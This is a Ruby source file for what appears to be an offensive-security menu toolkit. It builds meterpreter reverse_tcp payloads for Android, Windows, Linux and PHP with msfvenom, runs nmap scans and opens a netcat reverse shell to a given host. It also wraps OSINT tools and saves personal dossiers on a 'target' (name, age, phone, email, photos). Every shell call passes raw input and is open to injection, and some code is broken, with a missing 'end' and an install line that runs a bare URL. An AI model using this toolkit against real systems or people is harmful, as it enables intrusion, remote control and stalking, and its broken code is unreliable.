#!/usr/local/bin/ruby

require 'colorize'
require 'artii'
require 'terminal-table'
require 'net/http'
require 'json'
require 'time'

# lookup modules

def iplookup
    puts "Enter IP to lookup"
    print " > "
    ip = gets.chomp
    uri = URI("http://ip-api.com/json/#{ip}")
    response = Net::HTTP.get(uri)
    parsed = JSON.parse(response)
    rows = []
    rows << ['IP', parsed['query']]
    rows << ['Country', parsed['country']]
    rows << ['City', parsed['city']]
    rows << ['ISP', parsed['isp']]
    rows << ['Latitude', parsed['lat']]
    rows << ['Longitude', parsed['lon']]
    rows << ['Region', parsed['region']]
    rows << ['Region Name', parsed['regionName']]
    rows << ['Timezone', parsed['timezone']]
    rows << ['Zip', parsed['zip']]
    table = Terminal::Table.new :title => 'IP Lookup', :headings => ['Type', 'Value'], :rows => rows
    puts table
end


def dnslookup
    puts "Enter domain to lookup"
    print " > "
    domain = gets.chomp
    uri = URI("https://api.hackertarget.com/dnslookup/?q=#{domain}")
    response = Net::HTTP.get(uri)
    puts response
end

# msf modules


def mpandroidreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .apk for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.apk")
    puts "Payload created!"
end

def mpwindowsreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .exe for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Windows --arch x86 -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.exe")
    puts "Payload created!"
end

def mplinuxreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .elf for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Linux --arch x86 -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.elf")
    puts "Payload created!"
end

def mpphpreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .php for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom -p php/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.php")
    puts "Payload created!"
end

# nmap modules

def defaultscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap #{ip}")
end

def fastscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -F #{ip}")
end

def stealthscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sS #{ip}")
end

def udp
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sU #{ip}")
end

def osdetect
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -O #{ip}")
end

# netcat modules

def reverseshelllinux
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Starting reverse shell..."
    system("nc -e /bin/sh #{lhost} #{lport}")
end 

# osint modules

def osintsherlock
    if File.exist?('./scripts/sherlock/sherlock/sherlock.py')
        puts "Enter username to search for"
        print " > "
        username = gets.chomp
        puts "Searching..."
        system("python3 ./scripts/sherlock/sherlock/sherlock.py #{username}")
    else
        puts "Sherlock not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Sherlock..."
            system("git clone https://github.com/sherlock-project/sherlock.git ./scripts/sherlock")
            system("pip3 install -r ./scripts/sherlock/requirements.txt")
            puts "Sherlock installed!"
            puts "Use the command again to use Sherlock"
        else
            puts "Exiting..."
        end
    end
end

def osintsaveinfo
    puts ""
    puts "Welcome to the saveinfo module!\nIn this module gathered information by osint will be saved into file"
    puts "Enter target nickname:"
    print " > "
    target = gets.chomp
    puts "Enter target name:"
    print " > "
    name = gets.chomp
    puts "Enter target surname:"
    print " > "
    surname = gets.chomp
    puts "Enter target age:"
    print " > "
    age = gets.chomp
    puts "Enter target phone number:"
    print " > "
    phone = gets.chomp
    puts "Enter target email:"
    print " > "
    email = gets.chomp
    puts "Enter target photos url (separated by comma):"
    print " > "
    photos = gets.chomp
    puts "Add sherlock social media results? (y/n)"
    print " > "
    sherlock = gets.chomp
    if sherlock == "y"
        puts "Enter sherlock results file path:"
        print " > "
        sherlockfile = gets.chomp
    end
    puts "Add your own notes? (y/n)"
    print " > "
    notes = gets.chomp
    if notes == "y"
        puts "Enter your notes:"
        print " > "
        notes = gets.chomp
    end
    puts "Enter file path to save info (for example /home/user/Desktop/):"
    print " > "
    filepath = gets.chomp
    puts "Saving info..."
    datee = Time.now.strftime("%d/%m/%Y %H:%M")
    file = File.new("#{filepath}/#{target}.txt", "w")
    file.puts("sxRPTils saveinfo module - Results #{datee}")
    file.puts("===============================================")
    file.puts("Target nickname: #{target}")
    file.puts("Name: #{name}")
    file.puts("Surname: #{surname}")
    file.puts("Age: #{age}")
    file.puts("Phone: #{phone}")
    file.puts("Email: #{email}")
    file.puts("Photos: #{photos}")
    if sherlock == "y"
        file.puts("Sherlock results: #{sherlockfile}")
    end
    if notes == "y"
        file.puts("Notes: #{notes}")
    end
    file.puts("===============================================")
    file.close
    puts "Info saved!"
end

def theharvester
    # check if theharvester is installed
    if File.exist?('/usr/bin/theharvester') || File.exist?('./scripts/theharvester/theHarvester.py')
        puts "Enter target domain"
        print " > "
        domain = gets.chomp
        puts "Enter output file path"
        print " > "
        output = gets.chomp
        puts "Starting theharvester..."
        system("theharvester -d #{domain} -b all -f #{output}")
    else
        puts "Theharvester not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Do you want to install theharvester from apt or from github? (apt/github)"
            print " > "
            source = gets.chomp
            if source == "apt"
                puts "Installing theharvester..."
                system("sudo apt install theharvester")
                puts "Theharvester installed!"
                puts "Use the command again to use theharvester"
            elsif source == "github"
                puts "Installing theharvester..."
                system("git clone https://github.com/laramies/theHarvester.git ./scripts/theharvester")
                system("cd ./scripts/theharvester && sudo python3 setup.py install")
                puts "Theharvester installed!"
                puts "Use the command again to use theharvester"
        else
            puts "Exiting..."
        end
    end
end

def osintgram
    if File.exist?("./scripts/Osintgram/main.py")
        system("python3 ./scripts/Osintgram/main.py")
    else
        puts "Osintgram not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Osintgram..."
            system("git clone https://github.com/Datalux/Osintgram.git ./scripts/Osintgram")
            puts "Osintgram installed!"
            puts "Use the command again to use Osintgram"
        else
            puts "Exiting..."
        end
    end
end

# misc modules
def elpscrk
    if File.exist?('./scripts/elpscrk/elpscrk.py')
        puts "Enter password level: (1-5, check elpscrk docs for more info)"
        print " > "
        level = gets.chomp
        puts "Enter minimum password length"
        print " > "
        min = gets.chomp
        puts "Enter maximum password length"
        print " > "
        max = gets.chomp
        system("python3 ./scripts/elpscrk/elpscrk.py --level #{level} --min #{min} --max #{max}")
    else
        puts "elpscrk not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Elpscrk..."
            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
            puts "Elpscrk installed!"
            puts "Use the command again to use Elpscrk"
        else
            puts "Exiting..."
        end
    end
end

def elpscrkleet
    if File.exist?('./scripts/elpscrk/elpscrk.py')
        puts "Note: you are in leet mode. this will make from 'password' to 'p4ssw0rd'"
        puts "Enter password level: (1-5, check elpscrk docs for more info)"
        print " > "
        level = gets.chomp
        puts "Enter minimum password length"
        print " > "
        min = gets.chomp
        puts "Enter maximum password length"
        print " > "
        max = gets.chomp
        system("python3 ./scripts/elpscrk/elpscrk.py --leet --level #{level} --min #{min} --max #{max}")
    else
        puts "elpscrk not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Elpscrk..."
            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
            puts "Elpscrk installed!"
            puts "Use the command again to use Elpscrk"
        else
            puts "Exiting..."
        end
    end
end


        